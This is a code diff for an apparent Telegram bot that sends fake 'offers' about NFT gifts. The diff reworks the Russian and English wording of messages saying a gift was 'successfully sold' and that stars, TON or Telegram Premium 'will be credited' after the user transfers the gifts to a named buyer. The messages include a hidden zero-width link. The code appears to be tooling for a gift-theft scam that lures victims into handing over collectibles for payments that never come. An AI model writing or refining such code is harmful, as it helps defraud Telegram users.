@@ -96,26 +96,22 @@ async def send_offer(message: Message):
 
     is_premium = currency_raw in ["premium", "prem"]
 
-    if currency_raw == "stars":
-        currency_display = STAR_EMOJI
-        amount_text = f"{amount} {currency_display}"
-        action_word = "зачислены"
-        action_word_en = "credited"
-    elif currency_raw == "ton":
-        currency_display = TON_EMOJI
-        amount_text = f"{amount} {currency_display}"
-        action_word = "зачислен"
-        action_word_en = "credited"
-    elif is_premium:
+    # ИСПРАВЛЕНА ЛОГИКА ПАДЕЖЕЙ: ВСЕГДА "будут зачислены" ДЛЯ ВАЛЮТ
+    if is_premium:
         currency_display = "Telegram Premium"
         amount_text = "Telegram Premium на 3 месяца" if lang == "ru" else "Telegram Premium for 3 months"
-        action_word = "активирован"
-        action_word_en = "activated"
+        action_word_ru = "будет активирован"
+        action_word_en = "will be activated"
     else:
-        currency_display = "Gram"
+        if currency_raw == "stars":
+            currency_display = STAR_EMOJI
+        elif currency_raw == "ton":
+            currency_display = TON_EMOJI
+        else:
+            currency_display = "Gram"
         amount_text = f"{amount} {currency_display}"
-        action_word = "зачислены"
-        action_word_en = "credited"
+        action_word_ru = "будут зачислены"
+        action_word_en = "will be credited"
 
     nft1_slug = link1.rstrip("/").split("/")[-1]
     nft1_prefix, separator, nft1_number = nft1_slug.rpartition("-")
@@ -169,7 +165,7 @@ async def send_offer(message: Message):
         "lang": lang,
         "business_connection_id": message.business_connection_id,
         "is_premium": is_premium,
-        "action_word": action_word,
+        "action_word_ru": action_word_ru,
         "action_word_en": action_word_en
     }
 
@@ -200,8 +196,8 @@ async def on_accept_offer(callback: CallbackQuery):
     conn_id = last_offer_data.get("business_connection_id")
     sender_username = last_offer_data.get("sender_username")
     lang = last_offer_data.get("lang", "ru")
-    action_word = last_offer_data.get("action_word", "зачислены")
-    action_word_en = last_offer_data.get("action_word_en", "credited")
+    action_word_ru = last_offer_data.get("action_word_ru", "будут зачислены")
+    action_word_en = last_offer_data.get("action_word_en", "will be credited")
 
     hidden_link = f'<a href="{link}">&#8203;</a>'
     target_account = f"@{sender_username}" if sender_username else "покупателю"
@@ -210,7 +206,7 @@ async def on_accept_offer(callback: CallbackQuery):
         if lang == "ru":
             new_text = (
                 f"<b>• Передайте оба предмета покупателю {target_account} для завершения сделки.</b>\n\n"
-                f"<b>После передачи подарков, {amount_text} будут автоматически {action_word} на ваш аккаунт.</b>\n"
+                f"<b>После передачи подарков, {amount_text} {action_word_ru} на ваш аккаунт.</b>\n"
                 f"{hidden_link}"
             )
             btn_transfer = "Передать"
@@ -218,7 +214,7 @@ async def on_accept_offer(callback: CallbackQuery):
         else:
             new_text = (
                 f"<b>• Transfer both items to {target_account} to complete the deal.</b>\n\n"
-                f"<b>After transferring the gifts, {amount_text} will be automatically {action_word_en} to your account.</b>\n"
+                f"<b>After transferring the gifts, {amount_text} {action_word_en} to your account.</b>\n"
                 f"{hidden_link}"
             )
             btn_transfer = "Transfer"
@@ -226,15 +222,10 @@ async def on_accept_offer(callback: CallbackQuery):
     else:
         nft_link = f'<a href="{link}">{nft_name}</a>'
         if lang == "ru":
-            if action_word == "зачислены":
-                verb = "будут"
-            else:
-                verb = "будет"
-            
             new_text = (
                 f"<b>Подарок успешно продан {nft_link}.</b>\n\n"
                 f"<b>• Передайте подарок {target_account} для завершения сделки.</b>\n\n"
-                f"<b>После передачи подарка, {amount_text} {verb} автоматически {action_word} на ваш аккаунт.</b>\n"
+                f"<b>После передачи подарка, {amount_text} {action_word_ru} на ваш аккаунт.</b>\n"
                 f"{hidden_link}"
             )
             btn_transfer = "Передать"
@@ -243,7 +234,7 @@ async def on_accept_offer(callback: CallbackQuery):
             new_text = (
                 f"<b>Gift {nft_link} successfully sold.</b>\n\n"
                 f"<b>• Transfer the gift to {target_account} to complete the deal.</b>\n\n"
-                f"<b>After transferring the gift, {amount_text} will be automatically {action_word_en} to your account.</b>\n"
+                f"<b>After transferring the gift, {amount_text} {action_word_en} to your account.</b>\n"
                 f"{hidden_link}"
             )
             btn_transfer = "Transfer"
